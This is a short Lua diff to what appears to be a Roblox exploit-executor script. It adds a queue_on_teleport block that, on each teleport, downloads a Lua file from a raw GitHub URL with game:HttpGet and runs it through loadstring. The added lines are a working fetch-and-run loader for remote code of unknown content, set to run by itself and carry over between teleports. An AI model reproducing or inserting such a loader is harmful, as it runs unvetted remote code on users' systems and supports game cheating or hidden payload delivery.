@@ -1,4 +1,8 @@
- 
+if queue_on_teleport then
+    queue_on_teleport([[
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/sevastianjimenez66-spec/brainrot-server/main/brainrot.lua"))()
+  ]])
+end 
 
 -- SERVICIOS
 local Players = game:GetService("Players")
